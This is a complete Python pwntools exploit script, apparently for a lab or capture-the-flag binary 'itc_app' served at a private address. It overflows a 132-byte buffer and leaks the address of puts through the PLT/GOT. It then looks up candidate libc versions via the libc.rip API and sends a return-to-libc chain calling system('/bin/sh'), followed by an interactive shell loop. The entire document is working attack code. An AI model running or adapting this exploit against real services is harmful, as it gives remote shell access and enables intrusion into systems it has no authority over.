import json
import requests
from pwn import remote, u32, p32, flat, log

# Connection Information
conn = '192.168.0.156'
port = 9000

# Output Lines Configuration
OUTPUT_LINES_BEFORE, OUTPUT_LINES_AFTER = 6, 2

# Static Configuration
static = "./itc_app"
buffSize = 132

# URLs and Headers for API Requests
FIND_LIBC_URL = 'https://libc.rip/api/find'
LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
HEADERS = {'Content-Type': 'application/json'}

# Function Offsets
PLT_PUTS, MAIN_ADDR, GOT_PUTS = 0x8048340, 0x804847b, 0x80497ac


def leak_via_puts(conn, port,put_out_addr, msg="puts"):
    """
    Leaks randomised libc address via puts' PLT and function's GOT.
    """
    global proc

    proc = remote(conn,port)
    payload = flat(
        b'A' * buffSize,
        p32(PLT_PUTS),
        p32(MAIN_ADDR),
        p32(put_out_addr),
    )
    
    proc.sendline(payload)
    skip_lines(proc, OUTPUT_LINES_BEFORE)
    puts_addr = u32(proc.recv(4))
    skip_lines(proc, OUTPUT_LINES_AFTER)
    log.success(f"Leaked address of {msg}: {hex(puts_addr)}")
    return puts_addr


def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
    """
    Executes a return-to-libc attack to invoke system('/bin/sh').
    """

    # Leak puts address to get libc base address
    puts_addr = leak_via_puts(conn, port, GOT_PUTS)
    log.success(f'Leaked libc puts address: {hex(puts_addr)}')

    # Get lib base addr using puts_offset
    libc_base = puts_addr - puts_offset
    log.success(f'Calculated libc base address: {hex(libc_base)}')

    # Prepare the ROP chain payload
    system_addr = libc_base + system_offset
    exit_addr = libc_base + exit_offset
    binsh_addr = libc_base + binsh_offset
    
    # Create and send system('/bin/sh') buffer overflow payload
    payload = flat(
        b'A' * buffSize,
        p32(system_addr), 
        p32(exit_addr), 
        p32(binsh_addr),

    )

    proc.sendline(payload)
    log.success("Triggered system('/bin/sh') via buffer overflow.")

    # Skip the output lines before the reverse shell
    for _ in range(OUTPUT_LINES_AFTER):
        print(proc.recv(timeout = 0.05))
    
    # Attempt to interact with the reverse shell
    return handle_reverse_shell()


def find_potential_libcs(puts_addr):
    """
    Retrieves potential libc versions matching given offsets.
    """
    data = {"symbols": {"puts": hex(puts_addr)}}
    response = requests.post(FIND_LIBC_URL, headers=HEADERS, data=json.dumps(data))
    return response.json()


def get_libc_symbol_offsets(libc_id):
    """
    Retrieves offsets for essential libc symbols: 'puts', 'system', 'exit', 'str_bin_sh'.
    """
    libc_id = libc_id['id']
    libc_url = LIBC_SEARCH_URL + libc_id
    
    # Define symbols of interest
    find_symbols = {"symbols": ["puts", "system", "exit", "str_bin_sh"]}

    # Request these symbols from the database
    response = requests.post(libc_url, headers=HEADERS, data=json.dumps(find_symbols))
    symbol_json = response.json()

    # Extract and log the offsets for the requested symbols
    puts_off = symbol_json['symbols'].get('puts')
    system_off = symbol_json['symbols'].get('system')
    exit_off = symbol_json['symbols'].get('exit')
    binsh_off = symbol_json['symbols'].get('str_bin_sh')

    log.info(f"Trying offsets for libc version: {libc_id}")
    log.info(f"Offsets - puts: {puts_off}, system: {system_off}, str_bin_sh: {binsh_off}, exit: {exit_off}")

    # Return the offsets
    return puts_off, system_off, exit_off, binsh_off


def skip_lines(proc, lines):
    """
    Skips a specified number of lines in the process output.
    """
    for _ in range(lines):
        try:
            proc.recvline()
        except EOFError:
            pass


def handle_reverse_shell(redirect_stderr=True):
    """
    Handles the reverse shell interaction with the process.
    """
    try:
        proc.sendline(b"whoami 2>&1" if redirect_stderr else b"whoami")
        print(proc.recv(timeout=0.1).decode('utf-8'))
        while True:
            command = input("$ ")
            proc.sendline(command.encode('utf-8') + (b" 2>&1" if redirect_stderr else b""))
            print(proc.recv(timeout=0.2).decode('utf-8'))
    except EOFError:
        return 300
    return 200


def main():
    # Initial leak of the puts address to identify potential libc versions
    puts_addr = leak_via_puts(conn, port, GOT_PUTS)
    potential_libcs = find_potential_libcs(puts_addr)

    # Loop through each potential libc version to attempt exploitation
    for libc in potential_libcs:
        # Retrieve offsets for essential libc symbols: 'puts', 'system', 'exit', 'str_bin_sh'
        puts_off, system_off, exit_off, binsh_off = get_libc_symbol_offsets(libc)

        # Convert offsets from hexadecimal strings to integers
        puts_off, system_off, exit_off, binsh_off = \
            int(puts_off, 16), int(system_off, 16), int(exit_off, 16), int(binsh_off, 16)

        # Attempt return-to-libc attack with the current libc version's offsets
        ret_val = attempt_r2libc(puts_off, system_off, exit_off, binsh_off)

        # Handle the result of the exploitation attempt
        if ret_val == 200:
            print("Shell interaction finished successfully.")
            break
        else:
            log.failure("Exploit failed with the current libc version. Attempting next version...")
            proc.close()

    else:
        print("All potential libc versions have been attempted. Exploit may have failed.")
        proc.close()


if __name__ == "__main__":
    main()